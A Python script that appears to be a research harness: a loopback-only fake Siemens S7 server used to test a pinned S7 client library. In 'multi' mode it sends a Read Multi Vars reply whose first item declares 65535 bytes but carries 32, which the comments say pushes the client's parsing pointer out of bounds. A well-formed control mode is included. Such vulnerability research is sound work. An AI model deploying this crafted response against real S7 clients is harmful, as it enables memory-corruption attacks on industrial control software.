#!/usr/bin/env python3
"""Loopback S7 responder for the snap72shell two-item experiment.

Separate file from fake_s7_server.py so the witness-verified replay artifacts
stay byte-identical. Speaks COTP connect, S7 Setup Communication, and one
Read Multi Vars reply carrying two items. Never binds outside 127.0.0.1 and
never contacts a real PLC.

Modes:
  multi      item 0 declares 0xFFFF with 32 real bytes, item 1 declares 1
  multi-safe both items declare 1 byte (control; item 0 has an alignment pad)
"""
import socket
import sys

mode = sys.argv[1]                 # multi | multi-safe
port_file = sys.argv[2]
log_file = sys.argv[3]

log = open(log_file, "w", buffering=1)


def note(msg):
    log.write(msg + "\n")


srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("127.0.0.1", 0))
srv.listen(1)
srv.settimeout(30)
port = srv.getsockname()[1]
with open(port_file, "w") as pf:
    pf.write(str(port))
note("MODE=%s BIND=127.0.0.1:%d" % (mode, port))

conn, peer = srv.accept()
conn.settimeout(10)
note("ACCEPT from %s:%d" % (peer[0], peer[1]))


def recvn(n):
    out = b""
    while len(out) < n:
        chunk = conn.recv(n - len(out))
        if not chunk:
            raise EOFError("peer closed")
        out += chunk
    return out


def recv_frame():
    hdr = recvn(4)
    if hdr[0] != 3:
        raise ValueError("bad TPKT version: %s" % hdr.hex())
    total = (hdr[2] << 8) | hdr[3]
    frame = hdr + recvn(total - 4)
    note("RECV hex=" + frame.hex())
    return frame


def send_data(payload):
    total = 7 + len(payload)
    frame = bytes([3, 0, (total >> 8) & 0xFF, total & 0xFF, 2, 0xF0, 0x80]) + payload
    note("SEND hex=" + frame.hex())
    conn.sendall(frame)


def send_control(frame):
    note("SEND hex=" + frame.hex())
    conn.sendall(frame)


def u16(v):
    return bytes([(v >> 8) & 0xFF, v & 0xFF])


# --- COTP connection request -> connection confirm -------------------------
cr = recv_frame()
if cr[5] != 0xE0:
    raise ValueError("expected COTP CR, got %02x" % cr[5])
cc = bytearray(cr)
cc[5] = 0xD0
old_src = bytes(cr[8:10])
cc[6:8] = old_src
cc[8:10] = b"\x01\x00"
send_control(bytes(cc))

# --- S7 telegrams ----------------------------------------------------------
seen_negotiate = False
seen_read = False
for _ in range(8):
    frame = recv_frame()
    if len(frame) < 17 or frame[5] != 0xF0 or frame[7] != 0x32:
        raise ValueError("unexpected frame")
    payload = frame[7:]
    func = payload[10]
    seq = payload[4:6]

    if func == 0xF0 and not seen_negotiate:
        seen_negotiate = True
        resp = (b"\x32\x02\x00\x00" + seq + u16(8) + u16(0) + u16(0) +
                b"\xf0\x00" + u16(0x0100) + u16(0x0100) + u16(480))
        send_data(resp)

    elif func == 0x04 and not seen_read:
        seen_read = True
        if mode == "multi":
            # Item 0: 0xFFFF declared, 32 chosen bytes on the wire.
            # Item 1: plausible 1-byte item on the wire. The pinned client
            # computes item 1's source pointer as P + 4 + 65536 = P + 65540,
            # so it never reads this on-wire item 1 header.
            data0 = bytes((0x11 if i % 2 == 0 else 0x22) for i in range(32))
            item0 = b"\xff\x09" + u16(0xFFFF) + data0
            declared0 = 0xFFFF
        elif mode == "multi-safe":
            # Alignment pad: Slice=1 is rounded up to 2 at pinned line 425,
            # so item 1's header must start at P+6.
            item0 = b"\xff\x09" + u16(1) + b"\x5a" + b"\x00"
            declared0 = 1
        else:
            raise ValueError("unknown mode: %s" % mode)
        item1 = b"\xff\x09" + u16(1) + b"\x77"
        resp = (b"\x32\x02\x00\x00" + seq + u16(2) +
                u16(len(item0) + len(item1)) + u16(0) + b"\x04\x02" +
                item0 + item1)
        send_data(resp)
        note("ITEM0_DECLARED=%d ITEM0_REAL=%d ITEM1_DECLARED=1"
             % (declared0, len(item0) - 4))
        break
    else:
        raise ValueError("unexpected S7 function %02x" % func)

note("SERVER_DONE negotiate=%s read=%s" % (seen_negotiate, seen_read))
conn.close()
srv.close()
log.close()
